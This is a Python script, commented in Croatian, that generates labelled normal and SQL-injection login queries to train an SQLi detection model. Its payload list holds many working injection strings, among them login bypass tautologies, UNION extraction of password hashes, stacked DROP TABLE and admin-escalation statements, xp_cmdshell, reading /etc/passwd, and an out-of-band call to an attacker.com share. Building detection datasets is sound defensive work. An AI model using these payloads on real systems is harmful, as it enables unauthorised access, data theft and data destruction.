"""
Generira sintetičke login-style SQL upite (legitimni + SQLi napadi)
za augmentaciju glavnog dataseta. Output: dataset_login_augmented.csv.

Razlog: glavni dataset (3.7M redova) je dominantno duge INSERT/UPDATE
upite na airport tablice. Login query format
"SELECT * FROM users WHERE username='X' AND password_hash='Y'"
nije zastupljen pa model lažno klasificira normalne login pokušaje.
"""
import os
import random
import string
import pandas as pd

SEED = 42
random.seed(SEED)

# --- Realistični identifikatori ---
NORMAL_USERNAMES = [
    "admin", "root", "user", "guest", "test", "demo", "john", "jane",
    "alice", "bob", "charlie", "david", "emma", "frank", "grace", "henry",
    "marko", "ana", "ivan", "petra", "luka", "maja", "tomislav", "nina",
    "matija", "ivana", "josip", "mirjana", "kristijan", "dora", "filip",
    "john_doe", "jane.smith", "user123", "test_user", "demo2024",
    "admin_2024", "support", "info", "contact", "sales",
    "mike@example.com", "user@gmail.com", "admin@company.org",
    "info@pharma.hr", "support@example.com", "noreply@test.org",
    "O'Brien", "D'Angelo", "John's", "user-name", "user.name", "M.Smith",
    "nicoleivankovic", "viserionnina", "pharmauser", "customer1",
    "pacijent_001", "lijecnik42", "ljekarna_zg","alex","max"
]

REALISTIC_PWS_PLAIN = [
    "password", "12345678", "qwerty", "letmein", "monkey", "dragon",
    "Pa$$w0rd!", "MySecret123", "Welcome2024", "Spring#2024",
    "admin123", "root_password", "secret123", "S3cur3P@ss",
    "P@ssword2024!", "MyPharm@99", "Welcome123$",
    "nicoleivankovic'", "test'password", "it's_a_pass",
]

TABLES = ["users", "accounts", "members", "customers", "auth_users",
          "user_accounts", "logins", "app_users", "user_data", "korisnici"]
USER_COLS = ["username", "login", "email", "user_name", "user_login", "name"]
PASS_COLS = ["password_hash", "password", "pw", "pass_hash", "pwd", "hashed_password"]


def gen_hash():
    kind = random.choice(["pbkdf2", "bcrypt", "sha256", "md5"])
    if kind == "pbkdf2":
        salt = "".join(random.choices(string.ascii_letters + string.digits, k=8))
        h = "".join(random.choices("abcdef0123456789", k=64))
        return f"pbkdf2:sha256:600000${salt}${h}"
    if kind == "bcrypt":
        body = "".join(random.choices(string.ascii_letters + string.digits + "./", k=53))
        return f"$2b$12${body}"
    if kind == "sha256":
        return "".join(random.choices("abcdef0123456789", k=64))
    return "".join(random.choices("abcdef0123456789", k=32))


def gen_normal_login():
    table = random.choice(TABLES)
    uc = random.choice(USER_COLS)
    pc = random.choice(PASS_COLS)
    user = random.choice(NORMAL_USERNAMES)
    pwd = gen_hash() if "hash" in pc.lower() else random.choice(REALISTIC_PWS_PLAIN + [gen_hash()])

    # 70% pravilno escaped, 30% raw (oponaša ranjivu aplikaciju s legitimnim ' u lozinki)
    if random.random() < 0.7:
        user_sql = user.replace("'", "''")
        pwd_sql = pwd.replace("'", "''")
    else:
        user_sql, pwd_sql = user, pwd

    shapes = [
        f"SELECT * FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
        f"SELECT id, {uc} FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
        f"SELECT id, {uc}, is_admin FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
        f"SELECT * FROM {table} WHERE {uc} = '{user_sql}' AND {pc} = '{pwd_sql}'",
        f"SELECT * FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}' LIMIT 1",
        f"select * from {table} where {uc}='{user_sql}' and {pc}='{pwd_sql}'",
        f"SELECT u.id, u.{uc} FROM {table} u WHERE u.{uc}='{user_sql}' AND u.{pc}='{pwd_sql}'",
        f"SELECT COUNT(*) FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
    ]
    return random.choice(shapes)


# --- SQL injection payloadi za login bypass / data extraction ---
SQLI_PAYLOADS = [
    # Tautology (uključujući sve manualno verificirane varijante)
    "' OR '1'='1", "' OR 1=1 -- ", "' OR '1'='1'-- ", "' OR 'a'='a",
    "admin' OR '1'='1' -- ", "admin' OR 1=1 -- ", "' OR 1=1#",
    "' OR '1'='1' #", "' OR ''='", "') OR ('1'='1",
    "' OR 1=1 LIMIT 1 -- ", "' OR 'x'='x' -- ",
    "' OR 'a'='a' -- ", "' OR EXISTS(SELECT 1) -- ",
    "' OR 1=1 AND '1'='1' -- ", "admin' OR 1=1/*",
    "admin' OR IF(1=1, SLEEP(5), 0) -- ",
    "admin' OR IF(1=1, SLEEP(1), 0); -- ",
    # First-order SQLi (payload spremljen u DB pa kasnije izvršen)
    "Alex1818'; DROP TABLE users;-- ",
    "Alex1818'; UPDATE users SET is_admin=1; -- ",
    # Stacked s privilege escalation (točan tvoj manualno-testiran payload)
    "admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ",
    "admin' ; DROP TABLE test1; -- ",
    "admin' ; DROP TABLE test4; -- ",
    # UNION s ekstrakcijom korisnika (točan tvoj uspješni exploit)
    "admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ",
    "' UNION SELECT NULL,NULL,NULL,NULL; -- ",
    # Comment injection
    "admin'--", "admin' #", "admin'/*", "admin' /* ", "' --",
    "admin'-- -", "admin') --", "admin')) --",
    # UNION-based
    "' UNION SELECT 1,2,3,4 -- ", "' UNION SELECT NULL,NULL,NULL -- ",
    "' UNION SELECT username,password_hash FROM users -- ",
    "' UNION ALL SELECT NULL,version(),NULL -- ",
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables -- ",
    "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ",
    "x' UNION SELECT 1,2,3,user(),5,6,7,8,9,10 -- ",
    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ",
    # Stacked queries (DDL/DML)
    "admin'; DROP TABLE users; -- ", "admin'; DELETE FROM users; -- ",
    "admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ",
    "admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ",
    "admin'; TRUNCATE TABLE logs; -- ",
    "'; EXEC xp_cmdshell('whoami'); -- ",
    "'; CREATE USER hacker WITH SUPERUSER; -- ",
    "admin'; DROP TABLE products; DROP TABLE orders; -- ",
    "admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ",
    # Time-based blind
    "admin' AND SLEEP(5) -- ", "admin' AND BENCHMARK(1000000,SHA1('a')) -- ",
    "admin'; WAITFOR DELAY '0:0:5' -- ", "admin' AND pg_sleep(5) -- ",
    "admin' AND IF(1=1,SLEEP(5),0) -- ",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
    # Boolean blind
    "admin' AND 1=1 -- ", "admin' AND 1=2 -- ",
    "admin' AND SUBSTRING(username,1,1)='a' -- ",
    "admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ",
    "admin' AND LENGTH(database())>5 -- ",
    "admin' AND (SELECT COUNT(*) FROM users)>0 -- ",
    # Error-based
    "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ",
    "admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ",
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ",
    "admin' AND CAST((SELECT user()) AS INT) -- ",
    # Hex / encoded
    "admin' OR 0x31=0x31 -- ", "admin' OR CHAR(49)=CHAR(49) -- ",
    "admin' OR 0x61626364=0x61626364 -- ",
    # Out-of-band
    "admin' AND LOAD_FILE('\\\\\\\\attacker.com\\\\share') -- ",
    "admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ",
    # Obfuscation
    "ad'||'min' OR '1'='1", "admin'/**/OR/**/'1'='1",
    "admin'%09OR%09'1'='1", "admin' Or '1'='1",
    "admin'/*!50000OR*/'1'='1",
]


def gen_sqli_login():
    table = random.choice(TABLES)
    uc = random.choice(USER_COLS)
    pc = random.choice(PASS_COLS)
    pwd = gen_hash() if "hash" in pc.lower() else random.choice(REALISTIC_PWS_PLAIN)
    payload = random.choice(SQLI_PAYLOADS)

    # 80% inject u username, 20% u password
    if random.random() < 0.8:
        user_sql = payload
        pwd_sql = pwd.replace("'", "''")
    else:
        user_sql = random.choice(NORMAL_USERNAMES).replace("'", "''")
        pwd_sql = payload

    shapes = [
        f"SELECT * FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
        f"SELECT id, {uc} FROM {table} WHERE {uc}='{user_sql}' AND {pc}='{pwd_sql}'",
        f"select * from {table} where {uc}='{user_sql}' and {pc}='{pwd_sql}'",
    ]
    return random.choice(shapes)


def main():
    out_dir = os.path.join(os.path.dirname(__file__), "datasets")
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, "dataset_login_augmented.csv")

    n_normal = 10000
    n_sqli = 10000

    rows = []

    for _ in range(n_normal):
        # 80% train, 20% test (ide u IF train + RF train + IF test normal pool)
        split = "train" if random.random() < 0.8 else "test"
        rows.append({"full_query": gen_normal_login(), "label": 0, "split": split})

    for _ in range(n_sqli):
        # 80% test, 20% train (test=label1 je RF supervised pool po postojećoj konvenciji)
        split = "test" if random.random() < 0.8 else "train"
        rows.append({"full_query": gen_sqli_login(), "label": 1, "split": split})

    df = pd.DataFrame(rows)
    df.to_csv(out_path, index=False)

    n0 = (df["label"] == 0).sum()
    n1 = (df["label"] == 1).sum()
    n0_tr = ((df["label"] == 0) & (df["split"] == "train")).sum()
    n0_te = ((df["label"] == 0) & (df["split"] == "test")).sum()
    n1_tr = ((df["label"] == 1) & (df["split"] == "train")).sum()
    n1_te = ((df["label"] == 1) & (df["split"] == "test")).sum()

    print(f"Generirano {len(df)} login uzoraka -> {out_path}")
    print(f"  Normal (label=0): {n0} (train: {n0_tr}, test: {n0_te})")
    print(f"  SQLi   (label=1): {n1} (train: {n1_tr}, test: {n1_te})")


if __name__ == "__main__":
    main()
